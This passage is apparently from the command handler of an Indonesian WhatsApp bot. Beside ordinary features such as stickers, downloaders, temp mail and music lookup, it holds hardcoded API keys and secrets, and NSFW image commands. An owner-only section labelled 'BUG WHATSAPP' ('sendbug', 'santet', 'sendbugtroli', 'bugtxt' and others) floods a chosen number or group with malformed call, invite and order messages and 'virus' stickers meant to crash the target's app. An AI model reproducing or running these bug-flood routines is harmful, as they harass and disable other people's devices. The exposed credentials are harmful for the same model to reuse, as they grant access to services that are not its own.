		conn.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
//========================BUAT EMAIL============================//
case 'tempmail': {
m.reply(`Tunggu Lagi Di Buat Emailnya...`)
let error37;
try {
let dataemail = await fetchJson(`https://vihangayt.me/tools/tempmail`)
let emailjadi = dataemail.data[0]
let idemaile = dataemail.data[1]
let tglemail = dataemail.data[2]
conn.sendMessage(m.chat, {text: `📄Email: ${emailjadi}\n📌Id: ${idemaile}\n📆Tanggal: ${tglemail}`}, {quoted: m})
} catch (er) {
error37 = true;
} finally {
if (error37) {
replyerror("Yah Error:(.");
}
}
}
break
case 'inboxmail': case 'inboxemail': {
if (!text) return paycall(`Masukan Id Email Yang Sudah kalian buat'`)
m.reply(`Tunggu Lagi Di Cek Pesan Masuk Emailnya...`)
let error38;
try {
let hasilemail = await fetchJson(`https://vihangayt.me/tools/get_inbox_tempmail?q=${text}`)
let infoemail = hasilemail.data[0]
let inihasilnya = `📄Email: ${infoemail[0].toAddr}\n📝Text: ${infoemail[0].text}\n📊Size: ${infoemail[0].rawSize}\n📈Type: ${infoemail[0].headerSubject}\n📌Link Info: ${infoemail[0].fromAddr}\n🔗Url: ${infoemail[0].downloadUrl}`
conn.sendMessage(m.chat, {text: `${inihasilnya}`}, {quoted: m})
} catch (er) {
error38 = true;
} finally {
if (error38) {
replyerror("Yah Error:(.");
}
}
}
break
//=========================================================//
case 'wikipedia': {
if (!text) return paycall('put query')
wikipedia(`${text}`).then(res => {
    conn.sendFile2(m.chat, res.result.thumb, 'wiki.png',`*Judul:* ${res.result.judul}\n\n*Penjelasan:*\n${res.result.isi}\n\n*© Wikipedia*`, m)
  }).catch(() => { m.reply('Tidak Ditemukan') })
}
break
case 'enc': case 'encsc': {
const JavaScriptObfuscator = require('javascript-obfuscator')
if (!text) throw `[!] Masukan textnya`
let error15;
try {
let resenc = JavaScriptObfuscator.obfuscate(text)
m.reply(resenc.getObfuscatedCode())
} catch (er) {
					error15 = true;
				} finally {
					if (error15) {
						replyerror("Yah Proses Gagal :(");
					}
					}
}
break
case 'searchmusik': {
if (/document/.test(mime)) return paycall(`Kirim/Reply Video/Audio Kamu yang mau di cari judul lagunya dengan Caption ${prefix + command}`)
if (!/video/.test(mime) && !/audio/.test(mime)) return paycall(`Kirim/Reply Video/Audio Kamu yang mau di cari judul lagunya dengan Caption ${prefix + command}`)
if (!quoted) return paycall(`Kirim/Reply Video/Audio Kamu yang mau di cari judul lagunya dengan Caption ${prefix + command}`)
try {
let acrcloud = require('acrcloud')
m.reply(`Tunggu Lagi Mencari Judul Musik...`)
let acr = new acrcloud({
host: 'identify-eu-west-1.acrcloud.com',
access_key: '032babf75e1b0015c1295c1c720bda19',
access_secret: 'tjjcbm4CCaLcfc5Hmz7D9MgTELyYpe6UDdcX89dC'
})

if (/audio|video/.test(mime)) {
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
let ext = mime.split('/')[1]
fs.writeFileSync(`./src/${m.sender}.${ext}`, media)
let res = await acr.identify(fs.readFileSync(`./src/${m.sender}.${ext}`))
let { code, msg } = res.status
if (code !== 0) throw msg
let { title, artists, album, genres, release_date } = res.metadata.music[0]
let txt = `
🎶𝙅𝙐𝘿𝙐𝙇 𝙈𝙐𝙎𝙄𝙆 𝘿𝙄𝙏𝙀𝙈𝙐𝙆𝘼𝙉🎶
=============================
• 📌 *TITLE*: ${title}
• 👨‍🎤 𝙰𝚁𝚃𝙸𝚂𝚃: ${artists !== undefined ? artists.map(v => v.name).join(', ') : 'NOT FOUND'}
• 💾 𝙰𝙻𝙱𝚄𝙼: ${album.name || 'NOT FOUND'}
• 🌐 𝙶𝙴𝙽𝙴𝚁: ${genres !== undefined ? genres.map(v => v.name).join(', ') : 'NOT FOUND'}
• 📆 RELEASE DATE: ${release_date || 'NOT FOUND'}
=============================
`.trim()
fs.unlinkSync(`./src/${m.sender}.${ext}`)
conn.sendMessage(m.chat, { caption: txt, document: audio, mimetype: 'audio/mpeg', fileName: `${title}.mp3`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/0e2b5f224fdcaf4b61d02.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: m})}
                        } catch (error) {
        console.error(error);
        replyerror('Gagal mendeteksi lagu🥺🙏');
    }
                    }
break
case 'npmsearch': {
	if (!text) throw 'Input Query'
	let res = await fetch(`http://registry.npmjs.com/-/v1/search?text=${text}`)
	let { objects } = await res.json()
	if (!objects.length) throw `Query "${text}" not found :/`
	let txt = objects.map(({ package: pkg }) => {
		return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`
	}).join`\n\n`
	m.reply(txt)
}
break
case 'kalkulator': {
  let id = m.chat
  conn.math = conn.math ? conn.math : {}
  if (id in conn.math) {
    clearTimeout(conn.math[id][3])
    delete conn.math[id]
    m.reply('Hmmm...ngecheat?')
  }
  let val = text
    .replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
    .replace(/×/g, '*')
    .replace(/÷/g, '/')
    .replace(/π|pi/gi, 'Math.PI')
    .replace(/e/gi, 'Math.E')
    .replace(/\/+/g, '/')
    .replace(/\++/g, '+')
    .replace(/-+/g, '-')
  let format = val
    .replace(/Math\.PI/g, 'π')
    .replace(/Math\.E/g, 'e')
    .replace(/\//g, '÷')
    .replace(/\*×/g, '×')
  try {
    console.log(val)
    let result = (new Function('return ' + val))()
    if (!result) throw result
    m.reply(`${format} = ${result}`)
  } catch (e) {
    if (e == undefined) throw 'Isinya?'
    throw 'Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport'
  }
}
break
case 'sinonim': case 'persamaankata': {
    query = `input text\nEx. .${prefix} hello world\n<command> <tex>`
    text
    if (args.length >= 1) {
        text = args.slice(0).join(" ")
    } else if (m.quoted && m.quoted.text) {
        text = m.quoted.text
    } else throw query

    try {
        m.reply(wait)
        let res = await Persamaan_Kata(text)
        await conn.sendMessage(m.chat, { image: { url: res.image }, caption: "*[ Result ]*\n\n" + ArrClean(res.result) }, { quoted: m })
    } catch (e) {
        throw eror
    }
}
break
/*case 'fbdl': {
      if (!args[0]) throw `Input URL`;
      let error35;
try {
m.reply(wait)
let resfbdl = await fetchJson(`https://vihangayt.me/download/fb?url=${args[0]}`)
let hasildlnya = resfbdl.data
conn.sendMessage(m.chat, { video: { url: data.result }, caption: done }, { quoted: m})
//await conn.sendFile2(m.chat, hasildlnya.video_hd, '', done, m);
} catch (er) {
error35 = true;
} finally {
if (error35) {
replyerror("Yah Error:(.");
}
}
}
break*/
case 'fbdl': {
			if (args.length == 0) return reply(`Example: ${prefix + command} https://id-id.facebook.com/SamsungGulf/videos/video-bokeh/561108457758458/`)
			      let error35;
try {
m.reply(wait)
			axios.get(`https://api.lolhuman.xyz/api/facebook?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				//conn.sendMessage(m.chat, { video: { url: data.result }, caption: done }, { quoted: m})
				conn.sendFile2(m.chat, data.result[0], '', done, m);
			})
			} catch (er) {
error35 = true;
} finally {
if (error35) {
replyerror("Yah Error:(.");
}
}
			}
			break
case 'twtdl': case 'twt': case 'twitter': {
      if (!args[0]) throw `Input URL`;
      let error36;
try {
m.reply(wait)
let resdltwt = await fetchJson(`https://api.lolhuman.xyz/api/twitter?apikey=haikalgans&url=${args[0]}`)
let dltwtnya = resdltwt.result
let dlakuir = await dltwtnya.media[0]
conn.sendMessage(m.chat, { video: { url: dlakuir.url }, caption: done }, { quoted: m})
//await conn.sendFile2(m.chat, dlakuir.url, '', done, m);
} catch (er) {
error36 = true;
} finally {
if (error36) {
replyerror("Yah Error:(.");
}
}
}
break
case 'yandere': {
let { lookup } = require('mime-types')
  text = text.endsWith('SMH') ? text.replace('SMH', '') : text;
  if (!text) throw 'Input Query / yande.re Url';
  
  let [query, page] = text.split(' ');
  let res = await getYandeImage(query, page);

  if (res === 'in_progress') {
    await conn.sendMessage(m.chat, 'Fetching image. Please wait...', 'conversation', { quoted: m });
    return;
  }

  let mime = await lookup(res);
  text.match(URL_REGEX)
    ? await conn.sendMessage(
        m.chat,
        { [mime.split('/')[0]]: { url: res }, caption: `Success Download: ${await shortUrl(res)}` },
        { quoted: m }
      )
    : await conn.sendMessage(m.chat, { image: { url: res }, caption: `Result From: ${text}` }, { quoted: m });
};
break
case 'paizuri': {
    let urlnyacyy = 'https://api.waifu.im/search?included_tags=paizuri';
    try {
        const respai = await fetch(urlnyacyy);
        const datpay = await respai.json();

        if (datpay.images && datpay.images.length > 0) {
            const imageInfo = datpay.images[0];
            const caption = `
Signature: ${imageInfo.signature}
Extension: ${imageInfo.extension}
Image ID: ${imageInfo.image_id}
Favorites: ${imageInfo.favorites}
Source: ${imageInfo.source}
Width: ${imageInfo.width}
Height: ${imageInfo.height}
Byte Size: ${imageInfo.byte_size}
URL: ${imageInfo.url}
            `;
            const imageUrl = imageInfo.url;

           await conn.sendFile2(m.chat, imageUrl, null, caption, m);
        } else {
            m.reply('No anime images found.');
        }
    } catch (error) {
        console.error(error);
        m.reply('An error occurred while fetching the data.');
    }
}
break
case 'hen': {
    let anuhen = 'https://api.waifu.im/search/?is_nsfw=true';
    try {
        const resanuhen = await fetch(anuhen);
        const datanuhen = await resanuhen.json();

        if (datanuhen.images && datanuhen.images.length > 0) {
            const imageInfo = datanuhen.images[0];
            const caption = `
Signature: ${imageInfo.signature}
Extension: ${imageInfo.extension}
Image ID: ${imageInfo.image_id}
Favorites: ${imageInfo.favorites}
Source: ${imageInfo.source}
Width: ${imageInfo.width}
Height: ${imageInfo.height}
Byte Size: ${imageInfo.byte_size}
URL: ${imageInfo.url}
            `;
            const imageUrl = imageInfo.url;

           await conn.sendFile2(m.chat, imageUrl, null, caption, m);
        } else {
            m.reply('No anime images found.');
        }
    } catch (error) {
        console.error(error);
        m.reply('An error occurred while fetching the data.');
    }
}
break
case 'fantox': {
let arrlist = [
        "animal",
        "animalears",
        "anusview",
        "ass",
        "barefoot",
        "bed",
        "bell",
        "bikini",
        "blonde",
        "bondage",
        "bra",
        "breasthold",
        "breasts",
        "bunnyears",
        "bunnygirl",
        "chain",
        "closeview",
        "cloudsview",
        "cum",
        "dress",
        "drunk",
        "elbowgloves",
        "erectnipples",
        "fateseries",
        "fingering",
        "flatchest",
        "food",
        "foxgirl",
        "gamecg",
        "genshin",
        "glasses",
        "gloves",
        "greenhair",
        "hatsunemiku",
        "hcatgirl",
        "headband",
        "headdress",
        "headphones",
        "hentaimiku",
        "hentaivideo",
        "hloli",
        "hneko",
        "hololove",
        "horns",
        "inshorts",
        "japanesecloths",
        "necklace",
        "nipples",
        "nobra",
        "nsfwbeach",
        "nsfwbell",
        "nsfwdemon",
        "nsfwidol",
        "nsfwmaid",
        "nsfwmenu",
        "nsfwvampire",
        "nude",
        "openshirt",
        "pantyhose",
        "pantypull",
        "penis",
        "pinkhair",
        "ponytail",
        "pussy",
        "ribbons",
        "schoolswimsuit",
        "schooluniform",
        "seethrough",
        "sex",
        "sex2",
        "sex3",
        "shirt",
        "shirtlift",
        "skirt",
        "spreadlegs",
        "spreadpussy",
        "squirt",
        "stockings",
        "sunglasses",
        "swimsuit",
        "tail",
        "tattoo",
        "tears",
        "thighhighs",
        "thogirls",
        "topless",
        "torncloths",
        "touhou",
        "twintails",
        "uncensored",
        "underwear",
        "vocaloid",
        "weapon",
        "wet",
        "white",
        "whitehair",
        "wings",
        "withflowers",
        "withgun",
        "withpetals",
        "withtie",
        "withtree",
        "wolfgirl",
        "yuri"
    ]
    let listnya = arrlist.map((v, index) => {
        return `[ ${++index} ] ${prefix + command} ${v}`
    }).join("\n")
    let nah = `𝗟 𝗜 𝗦 𝗧
_Contoh: ${prefix + command} yuri_

${listnya}`
    if (!arrlist.includes(text)) return m.reply(nah)
    await m.reply(wait)
    try {
        let ani = await fetch("https://fantox-apis.vercel.app/" + text)
        let mek = await ani.json()
        await conn.sendFile2(m.chat, mek.url, "", `${done}`, m)
    } catch (e) {
        await m.reply(eror)
    }
}
break
  //(error41)
//========================END============================//
case 'id' :
        if (!isCreator) return paycall(`*khusus Owner*`)
        paytod(`${m.chat}`)
        break
case 'tlfn': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let ingponya = text.split('|')[0] ? text.split('|')[0] : '-'
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '2',
"scheduledTimestampMs": Date.now(),
"title": `${ingponya}`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
break
//========================BUG WHATSAPP=========================//
case 'sendbug': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
 var call = {
 scheduledCallCreationMessage: {
 callType: 2,
 scheduledTimestampMs:  Date.now(),
 title: `${weg}\n${tizi}`
 }
}
conn.relayMessage(nomor, call, {})
}
}
break
case 'oy': {
if (!isCreator) return m.reply("ngapain?") 
let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
for (let i = 0; i < jumlah ; i++){
 var call = {
 scheduledCallCreationMessage: {
 callType: 2,
 scheduledTimestampMs:  Date.now(),
 title: `${weg}\n${tizi}`
 }
}
conn.relayMessage(nomor, call, {})
await sleep(2000)
conn.sendMessage(nomor, { sticker : thumb }, { quoted: shinuwu })
await sleep(2000)
conn.relayMessage(nomor, call, {})
await sleep(2000)
}
}
break
case 'oygc': {
if (!isCreator) return m.reply("ngapain?") 
let memek = text.split("|")[0]+'@g.us'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
for (let i = 0; i < jumlah ; i++){
 var call = {
 scheduledCallCreationMessage: {
 callType: 2,
 scheduledTimestampMs:  Date.now(),
 title: `${weg}\n${tizi}`
 }
}
conn.relayMessage(nomor, call, {})
await sleep(2000)
conn.sendMessage(nomor, { sticker : thumb }, { quoted: shinuwu })
await sleep(2000)
conn.relayMessage(nomor, call, {})
await sleep(2000)
}
}
break
case 'santet': {
if (!isCreator) return
let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
conn.sendMessage(nomor, { sticker : virusgambar }, { quoted: shinuwu })
await sleep(60* secon)
}
}
break
case 'tesaja': {
conn.sendMessage(m.chat, { sticker : thumb }, { quoted:shinuwu })
}
break
case 'sendbuggc': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@g.us'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
var scheduledCallCreationMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '1',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `${weg}\n${tizi}`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(nomor, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(60* secon)
}
}
break
case 'sendbugpc': {
if (!isCreator) return m.reply(`*khusus Owner*`)
num = q.split('|')[0]+'@s.whatsapp.net'
jumlah = q.split('|')[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah; i++) {
var invite = generateWAMessageFromContent(num, proto.Message.fromObject({
"groupInviteMessage": {
         "groupJid": "120363144695962190@g.us",
	     "inviteCode": "63bqvAyYvuOQJtwf",
		 "inviteExpiration": "1689703732",
         "groupName": `${vapi()} ${philips}`,
         "jpegThumbnail": thumb,
         "caption": `${num}`
}
}), { userJid: m.chat, quoted: fbugstik })
conn.relayMessage(num, invite.message, { messageId: invite.key.id })
await conn.sendMessage(num, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(60* secon)
}
}
break
case 'sendbugtroli': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
var troli = generateWAMessageFromContent(nomor, proto.Message.fromObject({
"orderMessage": {
                  "sellerJid": "6282134110253@s.whatsapp.net",
                  "itemCount": 7777777,
                  "message": `${weg} ${weg}`,
                  "orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗"
}
}), { userJid: m.chat, quoted: fbugstik })
conn.relayMessage(nomor, troli.message, { messageId: troli.key.id })
await sleep(60* secon)
}
}
break
case 'sendbugtroligc': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@g.us'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
var troligc = generateWAMessageFromContent(nomor, proto.Message.fromObject({
"orderMessage": {
                  "sellerJid": "6282134110253@s.whatsapp.net",
                  "itemCount": 7777777,
                  "message": `${weg} ${weg}`,
                  "orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗"
}
}), { userJid: m.chat, quoted: fbugstik })
conn.relayMessage(nomor, troligc.message, { messageId: troligc.key.id })
await sleep(60* secon)
}
}
break
case 'sendbugstik': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
for (let i = 0; i < jumlah ; i++){
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
await sleep(1000)
}
}
break
case 'bugtxt': {
if (!isCreator) return m.reply(`*khusus Owner*`)
 let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
for (let i = 0; i < jumlah ; i++){
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(1000)
}
}
break
case 'jadikatalog': {
if (!isCreator) return paycall(`*khusus Owner*`)
let media = await quoted.download()
reply(global.wait)
var messa = await prepareWAMessageMedia({ image: media }, { upload: conn.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "",
"jpegThumbnail": thumb,
"title": `${text} ${philips}`,
"description": `${text} ${vapi()}`,
"productImageCount": 999999999,
"firstImageId": 1,
"retailerId": `〔 ıll ☄︎ ⫹⫺ ᴺᵉʳᵒ☃︎ˢᵉⁿᵖᵃⁱ 浤 ☄︎ llı 〕`,
"bodyText": `${text}`,
"footerText": `${text}`,
"url": "https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ"
},
"businessOwnerJid": "6282134110253@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}), { userJid: m.chat, quoted: fkontak })
conn.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
case 'tokatalog': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let atas = text.split('|')[0] ? text.split('|')[0] : '-'
let bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let media = await quoted.download()
reply(global.wait)
var messa = await prepareWAMessageMedia({ image: media }, { upload: conn.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "6764236690333549",
"jpegThumbnail": thumb,
"title": `${atas}`,
"description": `${bawah}`,
"productImageCount": 1,
"firstImageId": 1,
"retailerId": `〔 ıll ☄︎ ⫹⫺ ᴺᵉʳᵒ☃︎ˢᵉⁿᵖᵃⁱ 浤 ☄︎ llı 〕`,
"bodyText": `𝙎𝙃𝙄𝙉𝘾𝙃𝘼𝙉 メ 𝙒𝙄𝘽𝙐𝙎𝙊𝙁𝙏`,
"footerText": `𝙎𝙃𝙄𝙉𝘾𝙃𝘼𝙉 メ 𝙒𝙄𝘽𝙐𝙎𝙊𝙁𝙏`,
"url": "https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ"
},
"businessOwnerJid": "6282134110253@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 999,
"isForwarded": true
}
}
}), { userJid: m.chat, quoted: fkontak })
conn.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
//========================BUG WHATSAPP=========================//
case 'setpp': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!quoted) return paycall(`Send/Reply Images With Captions ${prefix+command}`)
if (!/image/.test(mime)) return paycall(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return paycall(`Send/Reply Image With Caption ${prefix + command}`)
reply(global.wait)
var media = await conn.downloadAndSaveMediaMessage(quoted)
try {
if (args[0] == "/full") {
var { img } = await generateProfilePicture(media)
await conn.query({ tag: 'iq',attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
} else { await conn.updateProfilePicture(botNumber, { url: media }) }
reply('DONE')
} catch { reply('Gagal Mengganti Photo Profile') }
}
break
//STICKER
case 's': case 'sticker': case 'stiker': {
if (!quoted) return paycall(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (quoted.isAnimated) {
               let media = await conn.downloadAndSaveMediaMessage(quoted)
               let webpToMp4 = await webp2mp4File(media)
               let encmedia = await conn.sendVideoAsSticker(m.chat, webpToMp4.result, m, {
                  packname: global.packname,
                  author: global.author
               })
               await fs.unlinkSync(encmedia)
            } else if (/image/.test(mime)) {
               let media = await quoted.download()
               let encmedia = await conn.sendImageAsSticker(m.chat, media, m, {
                  packname: global.packname,
                  author: global.author
               })
               await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
               if ((quoted.msg || quoted).seconds > 11) return paycall('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
               let media = await quoted.download()
               let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, {
                  packname: global.packname,
                  author: global.author
               })
               await fs.unlinkSync(encmedia)
            } else {
               paycall(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
            }
         }
         break
         case 'telestik': {
         if (args.length == 0) return reply(`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
         try {
         m.reply(global.wait)
         let restele = await fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=${apikey}&url=${args[0]}`)
         for (let teletik of restele.result.sticker) {
         await conn.sendImageAsSticker(m.chat, teletik, m, {
                  packname: global.packname,
                  author: global.author
               })
               }
               } catch (error) {
        console.error(error);
        replyerror('Yah Error:(');
    }
               }
break
case 'toimg': {
	reply(global.wait)
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return paycall(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await conn.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            conn.sendMessage(m.chat, { image: buffer }, { quoted: m })      
fs.unlinkSync(name)
        })
        
} else return paycall(`Please reply to non animated sticker`)
    }
    break
case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return paycall(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            if (!quoted) return paycall(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            reply(global.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            conn.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) return paycall(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!/video/.test(mime) && !/audio/.test(mime)) return paycall(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            if (!quoted) return paycall(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
            reply(global.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            conn.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${conn.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return paycall(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            if (!quoted) return paycall(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            reply(global.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            conn.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted: m})
            }
            break
            case 'togif': {
                if (!quoted) return paycall('Reply video')
                if (!/webp/.test(mime)) return paycall(`reply sticker with caption *${prefix + command}*`)
                reply(global.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await conn.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await conn.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
case 'swm': case 'take':
         case 'wm': {
            if (!quoted) return paycall(`Where is the text?`)
            if (quoted.isAnimated) {
               let media = await conn.downloadAndSaveMediaMessage(quoted)
               let webpToMp4 = await webp2mp4File(media)
               let encmedia = await conn.sendVideoAsSticker(m.chat, webpToMp4.result, m, {
                  packname: text.split('|')[0] ? text.split('|')[0] : pushname,
                  author: text.split('|')[1] ? text.split('|')[1] : ''
               })
               await fs.unlinkSync(encmedia)
            } else if (/image/.test(mime)) {
               let media = await quoted.download()
               let encmedia = await conn.sendImageAsSticker(m.chat, media, m, {
                  packname: text.split('|')[0] ? text.split('|')[0] : pushname,
                  author: text.split('|')[1] ? text.split('|')[1] : ''
               })
               await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
               if ((quoted.msg || quoted).seconds > 11) return paycall('Maximum 10 Seconds!')
               let media = await quoted.download()
               let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, {
                  packname: text.split('|')[0] ? text.split('|')[0] : pushname,
                  author: text.split('|')[1] ? text.split('|')[1] : ''
               })
               await fs.unlinkSync(encmedia)
            } else {
               paycall(`Photo/Video?`)
            }
            }
         break
         case 'smeme': {
                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return paycall(respond)
                if (!text) return paycall(respond)
                reply(global.wait)
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await conn.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans}`
                let pop = await conn.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
            break
            case 'qc': {
                const {
                    quote
                } = require('./lib/quote.js')
                if (!q) return paycall('Enter Text')
                let ppnyauser = await await conn.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
                const rest = await quote(q, pushname, ppnyauser)
                reply(global.wait)
                conn.sendImageAsSticker(m.chat, rest.result, m, {
                    packname: `${global.packname}`,
                    author: `${global.author}`
                })
            }
            break
case 'ttp':
case 'ttp2':
case 'ttp3':
case 'ttp4': 
case 'ttp5': {
if (args.length == 0) return paycall(`Example: ${prefix + command} ShinChan Uwu`)
reply(global.wait)
ini_txt = args.join(" ")
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=haikalgans&text=${ini_txt}`)
conn.sendImageAsSticker(m.chat, ini_buffer, m, {
                    packname: `${global.packname}`,
                    author: `${global.author}`
                })
